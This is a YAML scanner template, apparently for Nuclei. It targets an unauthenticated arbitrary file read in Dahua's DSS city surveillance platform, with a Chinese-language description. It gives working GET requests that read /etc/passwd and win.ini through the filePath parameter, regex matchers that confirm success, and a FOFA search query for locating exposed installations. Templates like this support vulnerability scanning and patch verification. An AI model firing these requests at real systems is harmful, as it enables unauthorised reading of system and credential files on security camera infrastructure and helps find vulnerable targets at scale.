id: dahua-dss-attachment-downloadAtt-fileread-1
info:
  name: 大华 DSS 城市安防监控系统 attachment_downloadAtt.action - 任意文件读取漏洞
  author: leadlife
  severity: high
  description: 大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经身份验证的远程攻击者 可以利用此漏洞获取系统内部敏感文件信息，使系统处于极不安全的状态。
  reference: 
    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%A4%A7%E5%8D%8EDSS-Diretory.yaml
  metadata:
    verified: true
    fofa-query: body="/portal/include/script/dahuaDefined/headCommon.js?type=index" && title="DSS" || app="dahua-DSS"
  tags: dahua,dss,fileread,iot

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///c:/windows/win.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200